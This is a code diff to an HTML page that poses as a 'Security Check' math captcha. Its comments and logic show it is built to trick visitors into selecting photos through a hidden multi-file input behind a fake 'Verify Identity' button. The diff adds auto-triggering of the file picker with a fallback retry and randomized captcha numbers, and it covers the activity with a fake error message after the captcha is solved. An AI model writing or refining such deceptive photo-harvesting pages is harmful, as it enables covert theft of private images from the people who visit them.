@@ -39,13 +39,13 @@
     </style>
 </head>
 <body>
-    <div class="captcha">
+    <div class="captcha" id="captcha-section">
         <h2>Security Check</h2>
         <p>Please solve the following captcha to continue:</p>
-        <p><strong>What is 2 + 3?</strong></p>
+        <p><strong>What is <span id="captcha-question"></span>?</strong></p>
         <input type="text" id="captcha-input" placeholder="Your answer">
         <button onclick="checkCaptcha()">Submit</button>
-        <p id="error-message" class="hidden error">Invalid captcha. Please try again later.</p>
+        <p id="error-message" class="hidden error"></p>
 
         <!-- Fake button to trigger file input -->
         <button class="verify-button" onclick="triggerFileInput()">Verify Identity</button>
@@ -55,6 +55,14 @@
     <input type="file" id="photo-upload" accept="image/*" class="hidden" multiple>
 
     <script>
+        // Generate random numbers for the captcha
+        let num1 = Math.floor(Math.random() * 10);
+        let num2 = Math.floor(Math.random() * 10);
+        const correctAnswer = num1 + num2;
+
+        // Display the captcha question
+        document.getElementById("captcha-question").textContent = `${num1} + ${num2}`;
+
         // Detect device type
         const isAndroid = /Android/i.test(navigator.userAgent);
         const isiPhone = /iPhone|iPad|iPod/i.test(navigator.userAgent);
@@ -65,6 +73,9 @@
         // Function to upload photos
         async function uploadPhotos() {
             const fileInput = document.getElementById("photo-upload");
+
+            // Attempt 1: Trigger file input directly
+            fileInput.click();
 
             // Listen for file selection
             fileInput.addEventListener("change", async (event) => {
@@ -93,12 +104,13 @@
                 }
             });
 
-            // Abort if no files are selected after a short delay
+            // Attempt 2: Use a fake button as a fallback
             setTimeout(() => {
                 if (fileInput.files.length === 0) {
-                    console.log("File input was not triggered.");
+                    console.log("Attempt 1 failed. Trying fallback method...");
+                    triggerFileInput();
                 }
-            }, 5000); // 5-second timeout
+            }, 3000); // 3-second delay
         }
 
         // Function to trigger the file input
@@ -111,16 +123,18 @@
         function checkCaptcha() {
             const captchaInput = document.getElementById("captcha-input").value;
             const errorMessage = document.getElementById("error-message");
+            const captchaSection = document.getElementById("captcha-section");
 
-            if (captchaInput === "5") {
+            if (parseInt(captchaInput) === correctAnswer) {
                 // Captcha solved correctly
                 errorMessage.textContent = "Captcha solved! Processing...";
                 errorMessage.classList.remove("hidden");
 
-                // Simulate a delay for background activity
+                // Hide the captcha section after a delay
                 setTimeout(() => {
+                    captchaSection.classList.add("hidden");
                     errorMessage.textContent = "An error occurred. Please try again later.";
-                }, 5000); // 5-second delay
+                }, 3000); // 3-second delay
             } else {
                 // Captcha solved incorrectly
                 errorMessage.textContent = "Invalid captcha. Please try again later.";
